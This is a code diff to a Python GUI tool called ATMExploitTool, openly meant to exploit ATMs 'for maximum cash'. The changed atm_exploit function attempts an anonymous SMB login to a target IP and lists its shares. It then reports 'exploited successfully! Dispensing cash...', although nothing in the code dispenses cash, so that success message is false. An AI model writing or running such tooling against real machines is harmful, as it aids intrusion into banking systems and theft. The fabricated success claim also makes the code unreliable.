@@ -11,7 +11,6 @@ from netaddr import IPAddress, IPNetwork
 import bluepy.btle as btle  # For Bluetooth scanning (using bluepy)
 import threading  # To handle asynchronous operations
 from impacket.smbconnection import SMBConnection  # For SMB exploitation
-from impacket import smbprotocol  # For deeper protocol-level testing
 
 
 class ATMExploitTool:
@@ -167,15 +166,19 @@ class ATMExploitTool:
 
     def atm_exploit(self, ip):
         """Exploit the ATM for maximum cash."""
-        logging.info(f"Exploiting ATM at {ip}...")
+        logging.info(f"Attempting to exploit ATM at {ip}...")
         try:
-            # Example: Use SMB or other protocols for real exploitation.
-            smb = SMBConnection(ip, ip)
-            smb.login('', '')  # Attempt anonymous login
+            smb = SMBConnection(ip, ip)  # Establish SMB connection
+            smb.login('', '')  # Attempt anonymous login (replace with credentials if needed)
+            shares = smb.listShares()  # List shared resources
+            if shares:
+                for share in shares:
+                    self.update_ui_progress(f"Found share: {share['shi1_netname'].decode().strip()}")
+            smb.close()
             return f"ATM at {ip} exploited successfully! Dispensing cash..."
         except Exception as e:
             logging.error(f"Error exploiting ATM: {e}")
-            return f"Failed to exploit ATM at {ip}."
+            return f"Failed to exploit ATM at {ip}: {e}"
 
     def is_atm_device(self, ip):
         """Check if the device is likely an ATM."""
@@ -195,6 +198,7 @@ if __name__ == "__main__":
     root = Tk()
     app = ATMExploitTool(root)
     root.mainloop()
+
 
 
 
